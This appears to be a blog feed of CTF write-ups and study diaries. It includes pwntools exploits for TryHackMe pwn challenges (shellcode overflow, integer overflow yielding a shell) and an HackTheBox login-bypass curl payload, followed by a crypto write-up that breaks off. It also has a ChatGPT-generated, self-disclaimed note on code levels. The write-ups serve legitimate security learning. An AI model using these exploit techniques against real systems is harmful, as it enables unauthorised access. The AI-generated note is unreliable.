AMD64 and the OS to linux. Here’s the exploit.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;10.10.107.8&quot;</span>, <span class="number">9004</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;I&#x27;m waiting for you at &quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">88</span></span><br><span class="line">leak_addr = r.recvline().decode()</span><br><span class="line">leak_addr = <span class="built_in">int</span>(leak_addr, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Leak address: <span class="subst">&#123;<span class="built_in">hex</span>(leak_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the architecture and os for the shellcode crafting</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&quot;A&quot;</span> * (offset - <span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">payload = shellcode + padding + p64(leak_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>By running this, you can get a shell and free to cat out the flag.txt.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">THM&#123;0h_n0o0o0o_h0w_Y0u_Won??&#125;</span><br></pre></td></tr></table></figure><h1 id="Challenge-5-pwn105">Challenge 5 - pwn105</h1><p>Let’s decompile the code to see it’s behavior. The following is the code decompiled by IDA.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num1; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num2; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sum; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  banner();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------=[ BAD INTEGERS ]=-------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;|-&lt; Enter two numbers to add &gt;-|\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;]&gt;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;num1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;]&gt;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;num2);</span><br><span class="line">  sum = num1 + num2;</span><br><span class="line">  <span class="keyword">if</span> ( (num1 &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> || (num2 &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[o.O] Hmmm... that was a Good try!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (sum &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[*] C: %d&quot;</span>, sum);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n[*] Popped Shell\n[*] Switching to interactive mode&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[*] ADDING %d + %d&quot;</span>, num1, num2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[*] RESULT: %d\n&quot;</span>, sum);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>According to the code, we can know the following things.</p><ol><li>This program takes two int as the input &amp; stored them as <code>unsigned int</code>.</li><li>If the MSB (sign bit) of <code>num1</code> or <code>num2</code> is not equal to 0, which means one of the num is less than 0, the program will output “\n[o.O] Hmmm… that was a Good try!\n” and exit the program.</li><li>Else if the MSB of the sum is less than 0, the program will return a shell, which is the winning condition.</li><li>Else the program will outuput the sum and exit.</li></ol><p>Since we can’t input any negative number or it will exit, we need another way to make the sum negative. We know that the maximum of an <code>unsigned int</code> is <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> and the MSB represents a sign, so we can input the maximum of the unsigned int as one of the num and input another int less than <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> to make the <code>sum</code> overflow, then it will be a negative int! The following is the exploit.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;10.10.107.8&quot;</span>, <span class="number">9005</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&quot;2147483647&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Here, I send 2147483647 and 1 to make the sum overflow to be -2147483648. That way, we can get the shell.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240727180209127.png" alt="Pwned"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">THM&#123;VerY_b4D_1n73G3rsss&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> Hacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 14] 用THM+影片繼續學Pwn</title>
      <link href="/posts/e58d0fa3/"/>
      <url>/posts/e58d0fa3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>今天下來嘉義了，明天準備坐船去澎湖。今天白天就是繼續看 Yuawn 的影片，搭配 TryHackMe 的練習，希望能夠更加熟悉 Pwn 的基礎！</p><h1 id="今日進度">今日進度</h1><ul><li><a href="https://www.youtube.com/watch?v=U8N6aE-Nq-Q&amp;t=128s">Binary Exploitation (Pwn) - Basic</a></li><li><a href="https://tryhackme.com/r/room/introtopwntools">Intro To Pwntools</a></li></ul><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>09：30</code></p></li><li><p>知識量：⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐⭐</p></li><li><p>精神狀態：⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Differences Between Byte Code, Assembly Code, and Machine Code</title>
      <link href="/posts/61fb2d5c/"/>
      <url>/posts/61fb2d5c/</url>
      
        <content type="html"><![CDATA[<h1 id="Disclaimer-⚠️">Disclaimer ⚠️</h1><p>These contents are generated by ChatGPT and are intended for my personal review only. The accuracy of the contents is not guaranteed.</p><h1 id="Byte-Code">Byte Code</h1><ul><li><strong>Definition</strong>: Byte code is an intermediate code form that is closer to machine language than source code but still independent of the specific hardware platform. It is typically generated by compilers of high-level languages and executed by virtual machines.</li><li><strong>Characteristics</strong>:<ul><li><strong>Platform Independence</strong>: Byte code can run on different hardware platforms as long as there is a corresponding virtual machine (e.g., JVM or Python Virtual Machine).</li><li><strong>Higher Abstraction Level</strong>: Closer to the structure of high-level languages compared to machine code.</li><li><strong>Requires Virtual Machine</strong>: Byte code is not executed directly by hardware but is interpreted or further compiled by virtual machines (e.g., Java Virtual Machine or Python Interpreter).</li></ul></li><li><strong>Examples</strong>: Compiled Java <code>.class</code> files or compiled Python <code>.pyc</code> files.</li></ul><h1 id="Assembly-Code">Assembly Code</h1><ul><li><p><strong>Definition</strong>: Assembly code is a low-level programming language that uses mnemonics to represent machine instructions, typically associated with a specific computer architecture.</p></li><li><p><strong>Characteristics</strong>:</p><ul><li><strong>Human-readable</strong>: Easier to read and understand than machine code, but still relatively difficult.</li><li><strong>Direct Correspondence to Machine Instructions</strong>: Each assembly instruction usually corresponds directly to a machine instruction.</li><li><strong>Hardware Dependent</strong>: Assembly code is closely related to specific processor architectures (e.g., x86, ARM) and requires an assembler to convert it into machine code.</li></ul></li><li><p><strong>Examples</strong>: A simple x86 assembly code example for adding two numbers and returning the result:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">section</span> .data</span><br><span class="line">    num1 <span class="built_in">db</span> <span class="number">10</span></span><br><span class="line">    num2 <span class="built_in">db</span> <span class="number">20</span></span><br><span class="line"><span class="meta">section</span> .text</span><br><span class="line">    <span class="meta">global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, [num1]</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">al</span>, [num2]</span><br><span class="line">    <span class="keyword">mov</span> [result], <span class="built_in">al</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="Machine-Code">Machine Code</h1><ul><li><strong>Definition</strong>: Machine code is the binary code that a computer’s CPU can directly understand and execute, consisting of binary digits (0 and 1).</li><li><strong>Characteristics</strong>:<ul><li><strong>Lowest-level Code</strong>: Made up of 0s and 1s, it is the most fundamental level of code that hardware can directly execute.</li><li><strong>Hardware Dependent</strong>: Each processor architecture has its own set of machine instructions, making machine code completely hardware-specific.</li><li><strong>Most Difficult to Read</strong>: Machine code is the hardest form of code for humans to understand, but it is the fastest to execute because it is directly executed by the hardware.</li></ul></li><li><strong>Examples</strong>: Machine code looks like a sequence of binary data:<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11001000 10110001 00000001 11000011</span><br></pre></td></tr></table></figure></li></ul><h1 id="Summary">Summary</h1><ul><li><p><strong>Byte Code</strong>:</p><ul><li><strong>Usage</strong>: Enables the same program to run on different platforms through virtual machines.</li><li><strong>Execution</strong>: Interpreted or JIT-compiled by the virtual machine.</li><li><strong>Languages</strong>: Java, Python, etc.</li></ul></li><li><p><strong>Assembly Code</strong>:</p><ul><li><strong>Usage</strong>: Provides precise control over hardware, used for writing high-performance or system-level code.</li><li><strong>Execution</strong>: Needs to be assembled into machine code by an assembler, then executed by the CPU.</li><li><strong>Languages</strong>: Used in system programming and other low-level applications.</li></ul></li><li><p><strong>Machine Code</strong>:</p><ul><li><strong>Usage</strong>: Direct instructions executed by computer hardware.</li><li><strong>Execution</strong>: Directly executed by the CPU.</li><li><strong>Languages</strong>: The final output of compilers and assemblers for languages like C, Rust, etc.</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> StudyNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Byte Code </tag>
            
            <tag> Assembly Code </tag>
            
            <tag> Machine Code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 13] 今天，從0開始學Pwn</title>
      <link href="/posts/98fc7fc6/"/>
      <url>/posts/98fc7fc6/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>今天起來後去看了一下 HTB 的一題 Pwn 題，做了一下不太會，決定找 Writeup。結果 Writeup 也看不太懂，我才發現自己 Pwn 的基礎好像不是很扎實，這樣下去也是看一題做一題，所以決定要先從基礎開始學習。使用的資源是用 Yuawn 大佬的課程影片，我會把影片放在下面。希望暑假結束前可以變強！</p><h1 id="今日進度">今日進度</h1><p>這些學習資源是練習 Pwn 基礎非常好的資料。看完 Yuawn 的影片之後去用 TryHackMe 的 Room 做練習，收穫頗多。</p><ul><li><a href="https://www.youtube.com/watch?v=U8N6aE-Nq-Q&amp;t=128s">Binary Exploitation (Pwn) - Basic</a></li><li><a href="https://tryhackme.com/r/room/introtopwntools">Intro To Pwntools</a></li></ul><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>12：00</code></p></li><li><p>知識量：⭐⭐⭐⭐</p></li><li><p>疲勞程度：⭐⭐⭐⭐</p></li><li><p>精神狀態：⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 12] 繼續刷HTB的題目！</title>
      <link href="/posts/11af25ee/"/>
      <url>/posts/11af25ee/</url>
      
        <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>今天繼續刷了 HTB 的題目，覺得真的他們的題目很不錯（包括題目的描述也是挺有趣的）。然後我 19 號要和家裡面一起回澎湖個幾天！可能會暫停更新個幾天。旅遊回來之後繼續努力學習！</p><h1 id="今日進度">今日進度</h1><ol><li><a href="https://cx330.tw/posts/acba6120/">[HTB] The Last Dance Writeup 💃</a></li><li><a href="https://cx330.tw/posts/cab519b8/">[HTB] Insomnia Writeup 💤</a></li></ol><h1 id="今日狀態">今日狀態</h1><ul><li><p>起床時間：<code>10：00</code></p></li><li><p>知識量：⭐⭐</p></li><li><p>疲勞程度：⭐⭐</p></li><li><p>精神狀態：⭐⭐⭐⭐</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF Training </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> CTF </tag>
            
            <tag> CyberSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HTB] Insomnia Writeup 💤</title>
      <link href="/posts/cab519b8/"/>
      <url>/posts/cab519b8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Challeng-Info">0x00 Challeng Info</h1><p>It’s a web challenge, so it gives us a website and the source code for us to analyze. Let’s see the description first.</p><blockquote><p>Welcome back to Insomnia Factory, where you might have to work under the enchanting glow of the moon, crafting dreams and weaving sleepless tales.</p></blockquote><p>Well, although it’s not helpful, it’s still a romantic setting for this challenge (you know, programmers &amp; hackers always work at night).</p><h1 id="0x01-Analyze">0x01 Analyze</h1><p>Since it gave us the source code, we should check it out first. The most important thing is under the <strong>controller directory</strong> (<code>Insomnia/web_insomnia/Insomnia/app/Controllers</code>), because it’s where the backend interact with users.</p><p>I check out the <code>ProfileController.php</code>, and find something interesting.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">&quot;administrator&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&quot;ProfilePage&quot;</span>, [</span><br><span class="line">        <span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span> =&gt; <span class="variable">$flag</span>,</span><br><span class="line">    ]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Haven&#x27;t seen you for a while&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&quot;ProfilePage&quot;</span>, [</span><br><span class="line">        <span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span> =&gt; <span class="variable">$content</span>,</span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So if we can login as <strong>administrator</strong>, then we can get the flag. Now the question is how we are able to do that. To know how, we should then find the answer in the login function, which is in <code>UserController.php</code>.</p><p>After analyzing the code, we can found that there’s an logic error in the code that the developer doesn’t notice it. In the <code>login()</code> function, the developer use <code>if (!count($json_data) == 2)</code> to check if the login data we passed has 2 arguments. But if we think it carefully, we can know that it’s different to <code>if (count($json_data) !== 2)</code>. Here’s are the differences.</p><ol><li><code>if (!count($json_data) == 2)</code><ul><li>First, it calculate <code>count($json_data)</code>, and it’s an INT.</li><li>Then, the “!” negates the result we get. So if <code>count($json_data)</code> does not equals to 0, the expression will get a <strong>false</strong>. Anyways, it will get a <strong>BOOL</strong> as it’s data type.</li><li>Finally, it checks whether the <strong>BOOL</strong> is equivalent to an <strong>INT</strong>, so the expression will always be a <strong>false</strong>, in other words, <strong>the program will never go into this if statement</strong>.</li></ul></li><li><code>if (count($json_data) !== 2)</code><ul><li>It calculate the <code>count($json_data)</code> and properly compare the number with 2.</li><li>So this is the correct way to check if the data count is legal.</li></ul></li></ol><p>The next thing you should know is everytime we sign in, the system will give us a token to verify our identitys. The following is the complete code of <code>ProfileController.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Controllers</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">CodeIgniter</span>\<span class="title">HTTP</span>\<span class="title">ResponseInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Config</span>\<span class="title">Paths</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">Key</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProfileController</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$token</span> = (<span class="keyword">string</span>) <span class="variable">$_COOKIE</span>[<span class="string">&quot;token&quot;</span>] ?? <span class="literal">null</span>;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(APPPATH . <span class="string">&quot;/../flag.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$token</span>)) &#123;</span><br><span class="line">            <span class="variable">$key</span> = (<span class="keyword">string</span>) <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;JWT_SECRET&quot;</span>);</span><br><span class="line">            <span class="variable">$jwt_decode</span> = JWT::<span class="title function_ invoke__">decode</span>(<span class="variable">$token</span>, <span class="keyword">new</span> <span class="title class_">Key</span>(<span class="variable">$key</span>, <span class="string">&quot;HS256&quot;</span>));</span><br><span class="line">            <span class="variable">$username</span> = <span class="variable">$jwt_decode</span>-&gt;username;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">&quot;administrator&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&quot;ProfilePage&quot;</span>, [</span><br><span class="line">                    <span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">                    <span class="string">&quot;content&quot;</span> =&gt; <span class="variable">$flag</span>,</span><br><span class="line">                ]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="string">&quot;Haven&#x27;t seen you for a while&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&quot;ProfilePage&quot;</span>, [</span><br><span class="line">                    <span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">                    <span class="string">&quot;content&quot;</span> =&gt; <span class="variable">$content</span>,</span><br><span class="line">                ]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So the final step is to sign in as administrator and copy the token we get. Let’s hack the planet!</p><h1 id="0x02-Exploit">0x02 Exploit</h1><p>To sign in, I tried to use the browser to send the request first. But it won’t work since the key “password” is still assigned a value of null string just like below. That way, we can’t sign in due to the wrong password.</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240716214725811.png" alt="Password is assigned"></p><p>To bypass this, I use <strong>curl</strong> to help me to send the request. The payload is the URL and the data, which is the username.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://94.237.51.8:32663/index.php/login --data-raw <span class="string">&#x27;&#123;&quot;username&quot;: &quot;administrator&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>And the terminal will shows the response, then we can copy the token just like this.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Login Succesful&quot;</span>,<span class="string">&quot;token&quot;</span>:<span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjExMjMwODEsImV4cCI6MTcyMTE1OTA4MSwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.fMLAS55mm69_aqQWEhehVlspjCvpfHJzOp4vy91Zjv8&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>The final step is going to <code>/index.php/profile</code> and paste the token we just got (by using the devtool to modify the token cookie). After refreshing the page, we can get the flag!</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240716215517124.png" alt="Pwned"></p><h1 id="0x03-Pwned">0x03 Pwned</h1><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTB&#123;I_just_want_to_sleep_a_little_bit!!!!!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Web </tag>
            
            <tag> HackTheBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HTB] The Last Dance Writeup 💃</title>
      <link href="/posts/acba6120/"/>
      <url>/posts/acba6120/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Challenge-Info">0x00 Challenge Info</h1><p>Hello hackers. Let’s see the encrypted message.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c4a66edfe80227b4fa24d431</span><br><span class="line">7aa34395a258f5893e3db1822139b8c1f04cfab9d757b9b9cca57e1df33d093f07c7f06e06bb6293676f9060a838ea138b6bc9f20b08afeb73120506e2ce7b9b9dcd9e4a421584cfaba2481132dfbdf4216e98e3facec9ba199ca3a97641e9ca9782868d0222a1d7c0d3119b867edaf2e72e2a6f7d344df39a14edc39cb6f960944ddac2aaef324827c36cba67dcb76b22119b43881a3f1262752990</span><br><span class="line">7d8273ceb459e4d4386df4e32e1aecc1aa7aaafda50cb982f6c62623cf6b29693d86b15457aa76ac7e2eef6cf814ae3a8d39c7</span><br></pre></td></tr></table></figure><p>And also, the description of this challenge is as follows.</p><blockquote><p>To be accepted into the upper class of the Berford Empire, you had to attend the annual Cha-Cha Ball at the High Court. Little did you know that among the many aristocrats invited, you would find a burned enemy spy. Your goal quickly became to capture him, which you succeeded in doing after putting something in his drink. Many hours passed in your agency’s interrogation room, and you eventually learned important information about the enemy agency’s secret communications. Can you use what you learned to decrypt the rest of the messages?</p></blockquote><p>According to this, we can probably know that it’s a ChaCha20 encryption. To know more about it, we can analyze the source code given by the challenge.</p><h1 id="0x01-Analyze">0x01 Analyze</h1><p>So here’s the code.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 